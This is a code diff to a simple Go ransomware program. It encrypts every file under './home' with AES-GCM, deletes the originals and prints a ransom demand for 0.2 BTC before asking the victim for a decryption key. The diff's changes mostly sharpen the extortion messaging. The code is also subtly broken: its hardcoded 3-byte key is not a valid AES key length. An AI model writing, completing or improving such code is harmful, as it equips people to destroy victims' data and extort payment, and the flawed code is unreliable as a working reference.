@@ -10,6 +10,7 @@ import (
 	"crypto/rand"
 )
 
+// Function to encrypt files
 func encryptFiles(gcm cipher.AEAD) {
 	// Loop through target files and encrypt them
 	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
@@ -27,7 +28,7 @@ func encryptFiles(gcm cipher.AEAD) {
 				encrypted := gcm.Seal(nonce, nonce, original, nil)
 
 				// Write encrypted contents
-				err = os.WriteFile(path + ".enc", encrypted, 0666)
+				err = os.WriteFile(path+".enc", encrypted, 0666)
 				if err == nil {
 					os.Remove(path) // Delete the original file
 				} else {
@@ -41,6 +42,7 @@ func encryptFiles(gcm cipher.AEAD) {
 	})
 }
 
+// Function to decrypt files
 func decryptFiles(gcm cipher.AEAD) {
 	// Loop through target encrypted files and decrypt them
 	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
@@ -73,10 +75,13 @@ func decryptFiles(gcm cipher.AEAD) {
 }
 
 func main() {
-	// Set the hardcoded key to "123" for encryption and decryption
-	key := []byte("123")
+	// Define the decryption key as a variable
+	var decryptionKey string = "123" // You can change this value as needed
 
-	// Initialize AES in GCM mode
+	// Initialize AES in GCM mode with the hardcoded key
+	key := []byte(decryptionKey)
+
+	// Initialize AES cipher block
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		panic("Error while setting up AES")
@@ -87,22 +92,31 @@ func main() {
 	}
 
 	// Encrypt files automatically
-	fmt.Println("Encrypting files...")
+	fmt.Println("Encrypting files... Please wait.")
+
+	// Encrypt all files in the directory
 	encryptFiles(gcm)
 
-	// Simulate the victim entering the correct key (here we hardcode it for simplicity)
-	// In a real-world scenario, you would prompt the victim to input the key
-	fmt.Println("Enter decryption key: ")
+	// After encryption, inform the target that payment is required to receive the key
+	fmt.Println("\nFiles have been encrypted. Please send the required payment (e.g., 0.2 BTC).")
+
+	// Simulate the target entering the decryption key after making payment
+	// In reality, this would come after payment is confirmed
+	fmt.Print("\nEnter the decryption key to unlock your files: ")
 	var inputKey string
 	fmt.Scanln(&inputKey)
 
-	// Validate the entered key
-	if inputKey != "123" {
-		fmt.Println("Invalid key! Decryption failed.")
+	// Validate the entered key with the variable password
+	if inputKey != decryptionKey {
+		fmt.Println("Invalid key! Decryption failed. Please send the correct payment and key.")
 		return
 	}
 
-	// If the correct key is entered, decrypt the files
-	fmt.Println("Decrypting files...")
+	// If the correct key is entered, proceed to decrypt the files
+	fmt.Println("\nCorrect key entered. Decrypting files...")
+
+	// Decrypt the encrypted files
 	decryptFiles(gcm)
+
+	fmt.Println("Decryption complete. Your files are restored.")
 }
